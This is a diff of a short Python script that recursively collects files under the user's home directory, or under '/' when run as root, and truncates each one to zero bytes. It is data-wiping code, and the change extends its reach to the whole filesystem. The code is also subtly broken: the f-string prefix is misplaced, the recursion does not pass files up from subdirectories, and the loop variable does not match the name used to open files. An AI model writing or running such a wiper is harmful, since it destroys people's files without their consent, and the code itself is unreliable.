@@ -1,7 +1,10 @@
 import getpass
 import os
 
-items = []
+if getpass.getuser() == "root":
+	root = "/"
+else:
+	root = "f/home/{getpass.getuser()}"
 
 def find_files(root):
 	global items
@@ -12,12 +15,11 @@ def find_files(root):
 		if os.path.isdir(child):
 			find_files(child)
 		else:
-			items.append(child)
-
-find_files(f"/home/{getpass.getuser()}")
+			yield child
 
 
-for item in items:
+
+for file in find_files(root):
 	try:
 		f = open(item, "bw")
 		f.truncate(0)
